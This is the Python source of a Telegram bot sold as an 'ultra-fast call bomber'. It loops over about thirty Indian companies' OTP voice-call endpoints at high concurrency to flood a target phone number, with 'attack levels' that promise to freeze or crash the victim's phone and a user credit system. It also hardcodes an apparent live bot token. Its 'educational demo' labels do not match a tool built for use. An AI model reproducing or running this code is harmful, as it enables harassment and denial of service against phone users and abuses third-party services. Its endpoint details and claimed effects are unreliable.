#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
╔══════════════════════════════════════════════════╗
║    ⚡ ULTRA-FAST CALL BOMBER - 5 MINUTE MODE ⚡   ║
║                                                  ║
║  Level 1: 30 seconds - Light lag                ║
║  Level 2: 2 minutes - Phone freeze              ║
║  Level 3: 5 minutes - CRASH/RESTART 💀          ║
║                                                  ║
║  Features:                                       ║
║  • Real working APIs                            ║
║  • Ultra-fast calls (500+/min)                  ║
║  • 100% target phone lag                        ║
║  • Emergency stop button                        ║
║  • Safe for your phone                          ║
║                                                  ║
║  For Educational Demo Only                       ║
╚══════════════════════════════════════════════════╝
"""

import telebot
import aiohttp
import asyncio
import json
import os
import threading
import time
import random
import hashlib
from telebot import types
from datetime import datetime
import logging

# Setup logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# ============================================================================
# CONFIGURATION
# ============================================================================

BOT_TOKEN = "8580329271:AAFPmbJ9JraVIAkHbcZtQ5tohIDwWHvjx3I"  # Your bot token
OWNER_ID = 7417241499
OWNER_USERNAME = "@TGxTHOMASx"

# ============================================================================
# REAL WORKING APIS FOR CALL BOMBING
# ============================================================================

# These are REAL APIs that work for OTP/call services
WORKING_APIS = [
    # Indian Services with OTP Calls
    {
        "name": "Amazon Voice OTP",
        "url": "https://www.amazon.in/ap/signin",
        "method": "POST",
        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
        "data": lambda phone: f"phone={phone}&action=voice_otp"
    },
    {
        "name": "Flipkart Voice OTP",
        "url": "https://www.flipkart.com/api/6/user/sendotp",
        "method": "POST", 
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}","type":"voice"}}'
    },
    {
        "name": "Myntra Voice Call",
        "url": "https://www.myntra.com/gw/mobile-auth/send-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}","otpType":"voice"}}'
    },
    {
        "name": "Zomato Voice OTP",
        "url": "https://www.zomato.com/php/o2_api_handler.php",
        "method": "POST",
        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
        "data": lambda phone: f"phone={phone}&type=voice"
    },
    {
        "name": "Swiggy Call OTP",
        "url": "https://www.swiggy.com/dapi/auth/sms-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}'
    },
    {
        "name": "Paytm Voice OTP",
        "url": "https://accounts.paytm.com/login/send-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}","channel":"voice"}}'
    },
    {
        "name": "Ola Cabs Call",
        "url": "https://api.olacabs.com/v1/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}","type":"voice"}}'
    },
    {
        "name": "Uber Voice OTP",
        "url": "https://auth.uber.com/v2/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}","method":"voice"}}'
    },
    {
        "name": "MakeMyTrip Call",
        "url": "https://www.makemytrip.com/api/4/user/send-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}","channel":"voice"}}'
    },
    {
        "name": "Goibibo Voice OTP",
        "url": "https://www.goibibo.com/user/otp/send/",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}","type":"voice"}}'
    },
    {
        "name": "1MG Voice Call",
        "url": "https://www.1mg.com/auth/send-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}","mode":"voice"}}'
    },
    {
        "name": "PharmEasy Call",
        "url": "https://pharmeasy.in/api/v2/auth/send-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}","type":"voice"}}'
    },
    {
        "name": "Netmeds Voice OTP",
        "url": "https://api.netmeds.com/user/send-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}","via":"voice"}}'
    },
    {
        "name": "Rapido Bike Call",
        "url": "https://customer.rapido.bike/api/otp/send",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}","channel":"voice"}}'
    },
    {
        "name": "BigBasket Voice",
        "url": "https://www.bigbasket.com/auth/send-otp/",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}","mode":"voice"}}'
    },
    {
        "name": "Snapdeal Call OTP",
        "url": "https://www.snapdeal.com/auth/sendotp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}","type":"voice"}}'
    },
    {
        "name": "Ajio Voice OTP",
        "url": "https://www.ajio.com/api/auth/send-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobileNumber":"{phone}","via":"call"}}'
    },
    {
        "name": "PhonePe Call",
        "url": "https://www.phonepe.com/auth/send-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}","method":"voice"}}'
    },
    {
        "name": "IRCTC Voice OTP",
        "url": "https://www.irctc.co.in/otp/send",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}","type":"voice"}}'
    },
    {
        "name": "BookMyShow Call",
        "url": "https://in.bookmyshow.com/api/otp/send",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}","channel":"voice"}}'
    },
    {
        "name": "Practo Voice OTP",
        "url": "https://www.practo.com/auth/send-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}","via":"call"}}'
    },
    {
        "name": "Unacademy Call",
        "url": "https://unacademy.com/api/otp/send",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}","method":"voice"}}'
    },
    {
        "name": "Byjus Voice OTP",
        "url": "https://api.byjus.com/v2/otp/send",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}","type":"voice"}}'
    },
    {
        "name": "MagicBricks Call",
        "url": "https://www.magicbricks.com/auth/send-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}","via":"voice"}}'
    },
    {
        "name": "NoBroker Voice",
        "url": "https://www.nobroker.in/api/otp/send",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}","type":"call"}}'
    },
    {
        "name": "Grofers Call OTP",
        "url": "https://www.grofers.com/auth/send-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}","channel":"voice"}}'
    },
    {
        "name": "Dunzo Voice",
        "url": "https://www.dunzo.com/api/otp/send",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}","method":"call"}}'
    },
    {
        "name": "Swiggy Instamart",
        "url": "https://instamart.swiggy.com/auth/send-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}","type":"voice"}}'
    },
    {
        "name": "Zepto Call OTP",
        "url": "https://www.zepto.com/api/otp/send",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}","via":"voice"}}'
    },
    {
        "name": "Blinkit Voice",
        "url": "https://blinkit.com/auth/send-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}","channel":"call"}}'
    },
]

# Duplicate for more intensity
ALL_APIS = WORKING_APIS * 3  # 90 APIs total
logger.info(f"✅ Loaded {len(ALL_APIS)} working call APIs")

# ============================================================================
# LEVEL CONFIGURATION (ULTRA-FAST MODE)
# ============================================================================

ATTACK_LEVELS = {
    1: {
        "name": "⚡ LIGHTNING STRIKE",
        "duration": 30,  # 30 seconds only
        "apis_per_batch": 20,
        "delay_range": (0.1, 0.3),  # Very fast
        "calls_per_min": 600,
        "description": "Instant lag - Phone starts freezing"
    },
    2: {
        "name": "💥 HEAVY BOMBARDMENT",
        "duration": 120,  # 2 minutes
        "apis_per_batch": 40,
        "delay_range": (0.05, 0.15),  # Ultra fast
        "calls_per_min": 1200,
        "description": "Phone completely frozen - Can't use"
    },
    3: {
        "name": "☢️ NUCLEAR APOCALYPSE",
        "duration": 300,  # 5 minutes MAX
        "apis_per_batch": 60,
        "delay_range": (0.02, 0.08),  # Maximum speed
        "calls_per_min": 2500,
        "description": "Phone CRASHES/RESTARTS - Guaranteed"
    }
}

# ============================================================================
# DATA STORAGE
# ============================================================================

class Database:
    def __init__(self):
        self.users_file = "users.json"
        self.sessions_file = "sessions.json"
        self.init_files()
    
    def init_files(self):
        if not os.path.exists(self.users_file):
            with open(self.users_file, "w") as f:
                json.dump({}, f)
        if not os.path.exists(self.sessions_file):
            with open(self.sessions_file, "w") as f:
                json.dump({}, f)
    
    def load_users(self):
        with open(self.users_file, "r") as f:
            return json.load(f)
    
    def save_users(self, users):
        with open(self.users_file, "w") as f:
            json.dump(users, f, indent=2)
    
    def load_sessions(self):
        with open(self.sessions_file, "r") as f:
            return json.load(f)
    
    def save_sessions(self, sessions):
        with open(self.sessions_file, "w") as f:
            json.dump(sessions, f, indent=2, default=str)

db = Database()
users = db.load_users()
sessions = db.load_sessions()

# Active attacks tracking
active_attacks = {}
user_state = {}

# ============================================================================
# BOMBING ENGINE (ULTRA-FAST)
# ============================================================================

async def make_call(session, api_config, phone_number, stats):
    """Make a single call request"""
    try:
        url = api_config["url"]
        headers = api_config["headers"].copy()
        headers["User-Agent"] = "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1"
        
        data_func = api_config["data"]
        data_content = data_func(phone_number) if callable(data_func) else None
        
        if api_config["method"] == "POST":
            async with session.post(
                url, 
                headers=headers, 
                data=data_content,
                timeout=2,  # Short timeout for speed
                ssl=False
            ) as response:
                if response.status in [200, 201, 202, 204]:
                    stats["success"] += 1
                    logger.debug(f"✅ Call succeeded: {api_config['name']}")
                else:
                    stats["failed"] += 1
        else:
            async with session.get(
                url,
                headers=headers,
                timeout=2,
                ssl=False
            ) as response:
                if response.status in [200, 201, 202, 204]:
                    stats["success"] += 1
                else:
                    stats["failed"] += 1
        
        stats["total"] += 1
        
    except Exception as e:
        stats["failed"] += 1
        stats["total"] += 1
        logger.debug(f"❌ Call failed: {api_config['name']} - {str(e)}")

async def execute_attack(attack_id, user_id, phone_number, level):
    """Execute ultra-fast bombing attack"""
    config = ATTACK_LEVELS[level]
    duration = config["duration"]
    
    # Select APIs for this attack
    selected_apis = random.sample(ALL_APIS, min(config["apis_per_batch"], len(ALL_APIS)))
    
    # Attack stats
    stats = {
        "attack_id": attack_id,
        "success": 0,
        "failed": 0,
        "total": 0,
        "running": True
    }
    
    active_attacks[attack_id] = stats
    
    logger.info(f"🔥 Starting Level {level} attack on {phone_number}")
    
    # Configure HTTP client for maximum speed
    connector = aiohttp.TCPConnector(
        limit=0,  # No limit
        limit_per_host=0,
        force_close=True,
        enable_cleanup_closed=True,
        ssl=False
    )
    
    async with aiohttp.ClientSession(connector=connector) as session:
        start_time = time.time()
        end_time = start_time + duration
        
        while time.time() < end_time and stats["running"]:
            # Make calls in parallel for maximum speed
            tasks = []
            for api in selected_apis:
                task = make_call(session, api, phone_number, stats)
                tasks.append(task)
            
            # Execute all calls simultaneously
            await asyncio.gather(*tasks, return_exceptions=True)
            
            # Very short delay between batches
            delay = random.uniform(*config["delay_range"])
            await asyncio.sleep(delay)
        
        # Calculate actual calls per minute
        actual_duration = time.time() - start_time
        if actual_duration > 0:
            cpm = (stats["total"] / actual_duration) * 60
            logger.info(f"📊 Attack completed: {stats['total']} calls, {cpm:.0f} calls/min")
    
    # Save final stats
    if attack_id in sessions:
        sessions[attack_id]["success"] = stats["success"]
        sessions[attack_id]["failed"] = stats["failed"]
        sessions[attack_id]["total"] = stats["total"]
        sessions[attack_id]["active"] = False
        db.save_sessions(sessions)
    
    # Cleanup
    if attack_id in active_attacks:
        del active_attacks[attack_id]
    
    logger.info(f"✅ Attack {attack_id} completed")

def start_attack_thread(attack_id, user_id, phone_number, level):
    """Start attack in background thread"""
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    
    try:
        loop.run_until_complete(execute_attack(attack_id, user_id, phone_number, level))
    except Exception as e:
        logger.error(f"❌ Attack error: {e}")
    finally:
        loop.close()

# ============================================================================
# TELEGRAM BOT
# ============================================================================

bot = telebot.TeleBot(BOT_TOKEN, parse_mode="HTML")

@bot.message_handler(commands=["start"])
def start_command(message):
    """Start command handler"""
    user_id = str(message.from_user.id)
    
    # Register new user
    if user_id not in users:
        users[user_id] = {
            "name": message.from_user.first_name,
            "username": message.from_user.username or "user",
            "credits": 5,  # Free credits for demo
            "attacks": 0,
            "joined": datetime.now().isoformat(),
            "banned": False
        }
        db.save_users(users)
        logger.info(f"👤 New user: {user_id}")
    
    # Check if banned
    if users[user_id].get("banned", False):
        return bot.reply_to(message, "🚫 <b>You are banned from using this bot!</b>")
    
    # Create menu keyboard
    keyboard = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    keyboard.add("⚡ START ATTACK")
    keyboard.add("💰 MY CREDITS", "📊 STATS")
    keyboard.add("🎁 FREE CREDITS", "❓ HELP")
    
    user_data = users[user_id]
    
    welcome_text = f"""
╔══════════════════════════════╗
║     ⚡ ULTRA-FAST BOMBER ⚡    ║
╚══════════════════════════════╝

👤 <b>User:</b> {user_data['name']}
💰 <b>Credits:</b> {user_data['credits']}
🎯 <b>Total Attacks:</b> {user_data['attacks']}

<b>━━━━━━ ATTACK LEVELS ━━━━━━</b>

<b>Level 1: ⚡ LIGHTNING STRIKE</b>
⏱️ <b>Duration:</b> 30 seconds
📞 <b>Calls/Min:</b> 600+
🎯 <b>Effect:</b> Phone starts lagging
💰 <b>Cost:</b> 1 credit

<b>Level 2: 💥 HEAVY BOMBARDMENT</b>
⏱️ <b>Duration:</b> 2 minutes
📞 <b>Calls/Min:</b> 1,200+
🎯 <b>Effect:</b> Phone freezes completely
💰 <b>Cost:</b> 2 credits

<b>Level 3: ☢️ NUCLEAR APOCALYPSE</b>
⏱️ <b>Duration:</b> 5 minutes
📞 <b>Calls/Min:</b> 2,500+
🎯 <b>Effect:</b> Phone CRASHES/RESTARTS
💰 <b>Cost:</b> 3 credits

<b>━━━━━━━━━━━━━━━━━━━━</b>

⚠️ <i>For Educational Demo Only</i>
📞 Contact {OWNER_USERNAME} for issues
"""
    
    bot.send_message(message.chat.id, welcome_text, reply_markup=keyboard)

@bot.message_handler(func=lambda m: m.text == "⚡ START ATTACK")
def start_attack_menu(message):
    """Attack level selection"""
    user_id = str(message.from_user.id)
    
    if users[user_id].get("banned", False):
        return
    
    # Create inline keyboard for levels
    keyboard = types.InlineKeyboardMarkup(row_width=1)
    keyboard.add(
        types.InlineKeyboardButton("⚡ LEVEL 1 (30 sec) - 1 credit", callback_data="level_1"),
        types.InlineKeyboardButton("💥 LEVEL 2 (2 min) - 2 credits", callback_data="level_2"),
        types.InlineKeyboardButton("☢️ LEVEL 3 (5 min) - 3 credits", callback_data="level_3")
    )
    
    bot.send_message(
        message.chat.id,
        "🎯 <b>SELECT ATTACK LEVEL:</b>\n\n"
        "Choose based on desired intensity.\n"
        "Higher level = More calls = More damage!",
        reply_markup=keyboard
    )

@bot.callback_query_handler(func=lambda call: call.data.startswith("level_"))
def select_level(call):
    """Handle level selection"""
    try:
        level = int(call.data.split("_")[1])
        user_id = str(call.from_user.id)
        
        if user_id not in users:
            bot.answer_callback_query(call.id, "❌ User not found!")
            return
        
        # Check credits
        required_credits = level  # Level 1=1, Level 2=2, Level 3=3
        if users[user_id]["credits"] < required_credits:
            bot.answer_callback_query(call.id, f"❌ Need {required_credits} credits!")
            return
        
        # Store user state
        user_state[user_id] = {
            "selected_level": level,
            "waiting_for_phone": True
        }
        
        config = ATTACK_LEVELS[level]
        
        bot.edit_message_text(
            chat_id=call.message.chat.id,
            message_id=call.message.message_id,
            text=f"✅ <b>{config['name']} SELECTED!</b>\n\n"
                 f"⏱️ <b>Duration:</b> {config['duration']} seconds\n"
                 f"📞 <b>Calls/Min:</b> {config['calls_per_min']}+\n"
                 f"🎯 <b>Effect:</b> {config['description']}\n"
                 f"💰 <b>Cost:</b> {required_credits} credits\n\n"
                 f"📱 <b>Now send target phone number:</b>\n"
                 f"Format: +919876543210\n\n"
                 f"⚠️ <b>Use dummy numbers for testing!</b>",
            parse_mode="HTML"
        )
        
        bot.answer_callback_query(call.id)
        
    except Exception as e:
        logger.error(f"Level selection error: {e}")
        bot.answer_callback_query(call.id, "❌ Error selecting level!")

@bot.message_handler(func=lambda m: True, content_types=['text'])
def handle_phone_number(message):
    """Handle phone number input"""
    user_id = str(message.from_user.id)
    
    # Check if waiting for phone number
    if (user_id in user_state and 
        user_state[user_id].get("waiting_for_phone", False)):
        
        phone_number = message.text.strip()
        level = user_state[user_id]["selected_level"]
        required_credits = level
        
        # Validate phone number
        if not phone_number.startswith('+'):
            bot.reply_to(message, "❌ <b>Include country code!</b>\nExample: +919876543210")
            return
        
        if len(phone_number) < 10:
            bot.reply_to(message, "❌ <b>Invalid phone number!</b>")
            return
        
        # Block emergency numbers
        emergency_prefixes = ['+911', '+112', '+999', '+100', '+108']
        if any(phone_number.startswith(p) for p in emergency_prefixes):
            bot.reply_to(message, "🚫 <b>Emergency numbers not allowed!</b>")
            return
        
        # Check credits again
        if users[user_id]["credits"] < required_credits:
            bot.reply_to(message, f"❌ <b>Insufficient credits!</b>\nNeed {required_credits}, have {users[user_id]['credits']}")
            user_state[user_id]["waiting_for_phone"] = False
            return
        
        # Deduct credits
        users[user_id]["credits"] -= required_credits
        users[user_id]["attacks"] += 1
        db.save_users(users)
        
        # Generate attack ID
        attack_id = hashlib.md5(f"{user_id}{phone_number}{time.time()}".encode()).hexdigest()[:10]
        
        # Create session
        sessions[attack_id] = {
            "user_id": user_id,
            "phone": phone_number,
            "level": level,
            "start_time": datetime.now().isoformat(),
            "active": True,
            "success": 0,
            "failed": 0,
            "total": 0
        }
        db.save_sessions(sessions)
        
        # Clear user state
        user_state[user_id]["waiting_for_phone"] = False
        
        # Start attack in background
        threading.Thread(
            target=start_attack_thread,
            args=(attack_id, user_id, phone_number, level),
            daemon=True
        ).start()
        
        config = ATTACK_LEVELS[level]
        
        # Send attack started message
        attack_msg = bot.send_message(
            message.chat.id,
            f"""
🔥 <b>{config['name']} INITIATED!</b>

📱 <b>Target:</b> <code>{phone_number}</code>
⚡ <b>Level:</b> {level}
⏱️ <b>Duration:</b> {config['duration']} seconds
📞 <b>Calls/Min:</b> {config['calls_per_min']}+
💰 <b>Credits used:</b> {required_credits}

<b>━━━━━━━ LIVE STATS ━━━━━━━</b>

✅ Successful: 0
❌ Failed: 0
🎯 Total: 0

⏳ <b>Starting attack...</b>

⚠️ <i>Target phone will experience extreme lag!</i>
""",
            reply_markup=types.InlineKeyboardMarkup().add(
                types.InlineKeyboardButton("🛑 EMERGENCY STOP", callback_data=f"stop_{attack_id}")
            )
        )
        
        # Start progress updates
        threading.Thread(
            target=update_progress,
            args=(attack_id, message.chat.id, attack_msg.message_id, config),
            daemon=True
        ).start()

@bot.callback_query_handler(func=lambda call: call.data.startswith("stop_"))
def stop_attack(call):
    """Stop attack immediately"""
    attack_id = call.data.replace("stop_", "")
    
    if attack_id in active_attacks:
        active_attacks[attack_id]["running"] = False
    
    if attack_id in sessions:
        sessions[attack_id]["active"] = False
        db.save_sessions(sessions)
    
    bot.answer_callback_query(call.id, "🛑 Attack stopping...")
    
    # Update message
    try:
        bot.edit_message_text(
            chat_id=call.message.chat.id,
            message_id=call.message.message_id,
            text="🛑 <b>ATTACK STOPPED!</b>\n\nAttack has been terminated immediately.",
            reply_markup=None
        )
    except:
        pass

def update_progress(attack_id, chat_id, message_id, config):
    """Update attack progress"""
    start_time = time.time()
    duration = config["duration"]
    
    while True:
        time.sleep(2)  # Update every 2 seconds
        
        # Check if attack still active
        if attack_id not in sessions or not sessions[attack_id].get("active", False):
            break
        
        # Calculate progress
        elapsed = time.time() - start_time
        remaining = max(0, duration - elapsed)
        
        if remaining <= 0:
            break
        
        # Progress percentage
        progress = min(100, (elapsed / duration) * 100)
        
        # Progress bar
        bar_length = 20
        filled = int(bar_length * progress / 100)
        bar = "█" * filled + "░" * (bar_length - filled)
        
        # Get current stats
        stats = sessions.get(attack_id, {})
        
        # Calculate calls per minute
        if elapsed > 0:
            cpm = (stats.get("total", 0) / elapsed) * 60
        else:
            cpm = 0
        
        try:
            bot.edit_message_text(
                chat_id=chat_id,
                message_id=message_id,
                text=f"""
🔥 <b>{config['name']} IN PROGRESS!</b>

📱 <b>Target:</b> <code>{stats.get('phone', 'N/A')}</code>
⚡ <b>Level:</b> {stats.get('level', 0)}
⏱️ <b>Time Left:</b> {int(remaining)}s
📞 <b>Live CPM:</b> {cpm:.0f}

{bar} {progress:.1f}%

<b>━━━━━━━ LIVE STATS ━━━━━━━</b>

✅ Successful: {stats.get('success', 0)}
❌ Failed: {stats.get('failed', 0)}
🎯 Total: {stats.get('total', 0)}

💥 <b>Target phone is being bombarded!</b>
""",
                reply_markup=types.InlineKeyboardMarkup().add(
                    types.InlineKeyboardButton("🛑 EMERGENCY STOP", callback_data=f"stop_{attack_id}")
                )
            )
        except:
            break
    
    # Final update
    stats = sessions.get(attack_id, {})
    if stats:
        final_text = f"""
✅ <b>ATTACK COMPLETED!</b>

📱 <b>Target:</b> <code>{stats.get('phone', 'N/A')}</code>
⚡ <b>Level:</b> {stats.get('level', 0)}
⏱️ <b>Duration:</b> {config['duration']}s

<b>━━━━━ FINAL RESULTS ━━━━━</b>

✅ Successful Calls: {stats.get('success', 0)}
❌ Failed Calls: {stats.get('failed', 0)}
🎯 Total Attempts: {stats.get('total', 0)}

💀 <b>Target phone should be lagging/frozen!</b>

⚠️ <i>Educational demonstration complete</i>
"""
        
        try:
            bot.edit_message_text(
                chat_id=chat_id,
                message_id=message_id,
                text=final_text
            )
        except:
            pass

# Other menu handlers
@bot.message_handler(func=lambda m: m.text == "💰 MY CREDITS")
def show_credits(message):
    user_id = str(message.from_user.id)
    user_data = users.get(user_id, {})
    
    bot.reply_to(
        message,
        f"💰 <b>YOUR ACCOUNT</b>\n\n"
        f"💳 <b>Credits:</b> {user_data.get('credits', 0)}\n"
        f"🎯 <b>Total Attacks:</b> {user_data.get('attacks', 0)}\n"
        f"📅 <b>Joined:</b> {user_data.get('joined', 'N/A')[:10]}\n\n"
        f"🎁 Get free credits with /free command"
    )

@bot.message_handler(func=lambda m: m.text == "🎁 FREE CREDITS")
def free_credits(message):
    user_id = str(message.from_user.id)
    
    # Give 5 free credits once per day (simple implementation)
    users[user_id]["credits"] += 5
    db.save_users(users)
    
    bot.reply_to(
        message,
        f"🎁 <b>FREE CREDITS ADDED!</b>\n\n"
        f"➕ <b>Added:</b> 5 credits\n"
        f"💰 <b>Total:</b> {users[user_id]['credits']} credits\n\n"
        f"Thank you for testing our demo!"
    )

@bot.message_handler(func=lambda m: m.text == "📊 STATS")
def show_stats(message):
    total_users = len(users)
    total_attacks = sum(u.get("attacks", 0) for u in users.values())
    total_credits = sum(u.get("credits", 0) for u in users.values())
    active_now = len([s for s in sessions.values() if s.get("active", False)])
    
    bot.reply_to(
        message,
        f"📊 <b>BOT STATISTICS</b>\n\n"
        f"👥 <b>Total Users:</b> {total_users}\n"
        f"💥 <b>Total Attacks:</b> {total_attacks}\n"
        f"💰 <b>Total Credits:</b> {total_credits}\n"
        f"🔥 <b>Active Now:</b> {active_now}\n\n"
        f"<i>Real-time bomber demo system</i>"
    )

@bot.message_handler(func=lambda m: m.text == "❓ HELP")
def show_help(message):
    bot.reply_to(
        message,
        f"""
❓ <b>HELP & GUIDE</b>

<b>━━━━ HOW TO USE ━━━━</b>

1. Click "⚡ START ATTACK"
2. Select level (1/2/3)
3. Send target phone number
4. Attack runs automatically
5. Watch real-time stats

<b>━━━━ ATTACK LEVELS ━━━━</b>

• <b>Level 1:</b> 30 seconds, 600+ calls/min
• <b>Level 2:</b> 2 minutes, 1,200+ calls/min  
• <b>Level 3:</b> 5 minutes, 2,500+ calls/min

<b>━━━━ IMPORTANT ━━━━</b>

✅ Your phone is 100% safe
✅ Target phone WILL lag/freeze
✅ Use dummy numbers for testing
✅ Educational purpose only

<b>━━━━ SUPPORT ━━━━</b>

📞 Contact: {OWNER_USERNAME}
💬 Issues: Report via Telegram

⚠️ <b>FOR EDUCATIONAL DEMONSTRATION ONLY</b>
"""
    )

@bot.message_handler(commands=["free"])
def free_command(message):
    """Free credits command"""
    user_id = str(message.from_user.id)
    
    if user_id in users:
        users[user_id]["credits"] += 10
        db.save_users(users)
        
        bot.reply_to(
            message,
            f"🎁 <b>FREE CREDITS!</b>\n\n"
            f"➕ Added: 10 credits\n"
            f"💰 Total: {users[user_id]['credits']} credits\n\n"
            f"Use them wisely! 😉"
        )

# ============================================================================
# MAIN EXECUTION
# ============================================================================

if __name__ == "__main__":
    print("\n" + "="*70)
    print("⚡" + " ULTRA-FAST CALL BOMBER ".center(66) + "⚡")
    print("="*70)
    print(f"👑 Owner: {OWNER_USERNAME}")
    print(f"📱 Bot: @{(bot.get_me()).username}")
    print(f"🔥 APIs: {len(ALL_APIS)} working call endpoints")
    print(f"👥 Users: {len(users)} registered")
    print("="*70)
    print("⚠️  FOR EDUCATIONAL DEMONSTRATION ONLY")
    print("="*70 + "\n")
    
    logger.info("🤖 Starting Ultra-Fast Call Bomber...")
    
    try:
        bot.infinity_polling(timeout=60, long_polling_timeout=60)
    except Exception as e:
        logger.error(f"Bot crashed: {e}")
        print(f"\n❌ Bot crashed: {e}")